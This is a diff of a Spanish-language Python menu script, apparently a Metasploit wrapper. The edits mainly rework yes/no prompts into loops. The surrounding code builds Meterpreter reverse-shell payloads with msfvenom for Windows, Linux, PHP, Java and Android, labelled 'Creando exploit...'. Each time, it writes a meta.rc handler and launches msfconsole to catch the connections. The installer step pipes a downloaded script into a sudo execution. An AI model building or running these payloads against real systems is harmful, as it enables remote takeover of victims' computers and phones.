@@ -143,11 +143,17 @@ def funcion3():
     print("* Si quieres ayudarme con este proyecto este es mi discord: CipoteMan#3436\n")
     print("* Espero que le sirva de utilidad :D\n")
     print("")
-    variable = input("Desea volver al menu principal? (s/n): ")
-    if variable == "s":
-        menu()
-    else:
-        exit()
+    while True:
+        variable = input("Desea volver al menu principal? (s/n): ")
+        opcions = ["s", "S"]
+        opciono = ["n", "N"]
+        if(variable in opcions):
+            menu()
+        elif(variable in opciono):
+            exit()
+        else:
+            print("Esa respuesta no existe.")
+            continue
 
 def funcion4():
 
@@ -160,12 +166,19 @@ def funcion4():
         os.system("start https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe")
         os.system("start https://github.com/oneclick/rubyinstaller2/releases/download/RubyInstaller-2.6.3-1/rubyinstaller-devkit-2.6.3-1-x64.exe")
     else:
-        seguro = input("Metasploit es necesario para que funcione este programa, quieres continuar? (s/n): ")
-        if seguro == "s" or "S":
-            os.system('cls' if os.name == 'nt' else 'clear')
-            os.system("sudo apt install curl && curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && sudo chmod +x * && sudo ./msfinstall")
-        else:
-            menu()
+        while True:
+            seguro = input("Metasploit es necesario para que funcione este programa, quieres continuar? (s/n): ")
+            opcions = ["s", "S"]
+            opciono = ["n", "N"]
+            if(seguro in opcions):
+                os.system('cls' if os.name == 'nt' else 'clear')
+                os.system("sudo apt install curl && curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && sudo chmod +x * && sudo ./msfinstall")
+                break
+            elif(seguro in opciono):
+                menu()
+            else:
+                print("Esa respuesta no existe")
+                continue
 
 def funcion5():
 
@@ -214,7 +227,6 @@ def opcion1():
     os.system('cls' if os.name == 'nt' else 'clear')
     print("Creando exploit...")
     os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -f exe -o {}.exe".format(lhost, lport, output))
-    salir = input("Desea abrir el listener de metasploit? (s/n): ")
     f = open("meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/handler\n")
@@ -223,10 +235,17 @@ def opcion1():
         f.write("set lport {}\n".format(lport))
         f.write("exploit")
         f.close()
-    if salir == "s" or "S":
-        os.system("msfconsole -r meta.rc")
-    else:
-        menu()
+    while True:
+        salir = input("Desea abrir el listener de metasploit? (s/n): ")
+        opcions = ['s', 'S']
+        opciono = ['n', 'N']
+        if(salir in opcions):
+            os.system("msfconsole -r meta.rc")
+        elif(salir in opciono):
+            menu()
+        else:
+            print("Esa respuesta no existe")
+            continue
 
 def opcion2():
 
@@ -238,7 +257,6 @@ def opcion2():
     os.system('cls' if os.name == 'nt' else 'clear')
     print("Creando exploit...")
     os.system("msfvenom -p windows/meterpreter/reverse_https lhost={} lport={} -f exe -o {}.exe".format(lhost, lport, output))
-    salir = input("Desea abrir el listener de metasploit? (s/n): ")
     f = open("meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/handler\n")
@@ -247,10 +265,17 @@ def opcion2():
         f.write("set lport {}\n".format(lport))
         f.write("exploit")
         f.close()
-    if salir == "s" or "S":
-        os.system("msfconsole -r meta.rc")
-    else:
-        menu()
+    while True:
+        salir = input("Desea abrir el listener de metasploit? (s/n): ")
+        opcions = ['s', 'S']
+        opciono = ['n', 'N']
+        if(salir in opcions):
+            os.system("msfconsole -r meta.rc")
+        elif(salir in opciono):
+            menu()
+        else:
+            print("Esa respuesta no existe")
+            continue
 
 def opcion3():
 
@@ -262,7 +287,6 @@ def opcion3():
     os.system('cls' if os.name == 'nt' else 'clear')
     print("Creando exploit...")
     os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp lhost={} lport={} -f elf -o {}.elf".format(lhost, lport, output))
-    salir = input("Desea abrir el listener de metasploit? (s/n): ")
     f = open("meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/handler\n")
@@ -271,10 +295,17 @@ def opcion3():
         f.write("set lport {}\n".format(lport))
         f.write("exploit")
         f.close()
-    if salir == "s" or "S":
-        os.system("msfconsole -r meta.rc")
-    else:
-        menu()
+    while True:
+        salir = input("Desea abrir el listener de metasploit? (s/n): ")
+        opcions = ['s', 'S']
+        opciono = ['n', 'N']
+        if(salir in opcions):
+            os.system("msfconsole -r meta.rc")
+        elif(salir in opciono):
+            menu()
+        else:
+            print("Esa respuesta no existe")
+            continue
 
 def opcion4():
 
@@ -286,7 +317,6 @@ def opcion4():
     os.system('cls' if os.name == 'nt' else 'clear')
     print("Creando exploit...")
     os.system("msfvenom -p linux/x64/meterpreter/reverse_https lhost={} lport={} -f elf -o {}.elf".format(lhost, lport, output))
-    salir = input("Desea abrir el listener de metasploit? (s/n): ")
     f = open("meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/handler\n")
@@ -295,10 +325,17 @@ def opcion4():
         f.write("set lport {}\n".format(lport))
         f.write("exploit")
         f.close()
-    if salir == "s" or "S":
-        os.system("msfconsole -r meta.rc")
-    else:
-        menu()
+    while True:
+        salir = input("Desea abrir el listener de metasploit? (s/n): ")
+        opcions = ['s', 'S']
+        opciono = ['n', 'N']
+        if(salir in opcions):
+            os.system("msfconsole -r meta.rc")
+        elif(salir in opciono):
+            menu()
+        else:
+            print("Esa respuesta no existe")
+            continue
 
 def opcion5():
 
@@ -310,7 +347,6 @@ def opcion5():
     os.system('cls' if os.name == 'nt' else 'clear')
     print("Creando exploit...")
     os.system("msfvenom -p php/meterpreter_reverse_tcp lhost={} lport={} -f raw -o {}".format(lhost, lport, output))
-    salir = input("Desea abrir el listener de metasploit? (s/n): ")
     f = open("meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/handler\n")
@@ -319,11 +355,17 @@ def opcion5():
         f.write("set lport {}\n".format(lport))
         f.write("exploit")
         f.close()
-    if salir == "s" or "S":
-        os.system("msfconsole -r meta.rc")
-    else:
-        menu()
-
+    while True:
+        salir = input("Desea abrir el listener de metasploit? (s/n): ")
+        opcions = ['s', 'S']
+        opciono = ['n', 'N']
+        if(salir in opcions):
+            os.system("msfconsole -r meta.rc")
+        elif(salir in opciono):
+            menu()
+        else:
+            print("Esa respuesta no existe")
+            continue
 def opcion6():
 
     clear()
@@ -334,7 +376,6 @@ def opcion6():
     os.system('cls' if os.name == 'nt' else 'clear')
     print("Creando exploit...")
     os.system("msfvenom -p java/meterpreter/reverse_tcp lhost={} lport={} -f jar -o {}.jar".format(lhost, lport, output))
-    salir = input("Desea abrir el listener de metasploit? (s/n): ")
     f = open("meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/handler\n")
@@ -343,10 +384,17 @@ def opcion6():
         f.write("set lport {}\n".format(lport))
         f.write("exploit")
         f.close()
-    if salir == "s" or "S":
-        os.system("msfconsole -r meta.rc")
-    else:
-        menu()
+    while True:
+        salir = input("Desea abrir el listener de metasploit? (s/n): ")
+        opcions = ['s', 'S']
+        opciono = ['n', 'N']
+        if(salir in opcions):
+            os.system("msfconsole -r meta.rc")
+        elif(salir in opciono):
+            menu()
+        else:
+            print("Esa respuesta no existe")
+            continue
 
 def opcion7():
 
@@ -358,7 +406,6 @@ def opcion7():
     os.system('cls' if os.name == 'nt' else 'clear')
     print("Creando exploit...")
     os.system("msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} -o {}.apk".format(lhost, lport, output))
-    salir = input("Desea abrir el listener de metasploit? (s/n): ")
     f = open("meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/handler\n")
@@ -367,10 +414,17 @@ def opcion7():
         f.write("set lport {}\n".format(lport))
         f.write("exploit")
         f.close()
-    if salir == "s" or "S":
-        os.system("msfconsole -r meta.rc")
-    else:
-        menu()
+    while True:
+        salir = input("Desea abrir el listener de metasploit? (s/n): ")
+        opcions = ['s', 'S']
+        opciono = ['n', 'N']
+        if(salir in opcions):
+            os.system("msfconsole -r meta.rc")
+        elif(salir in opciono):
+            menu()
+        else:
+            print("Esa respuesta no existe")
+            continue
 
 def code1():
 
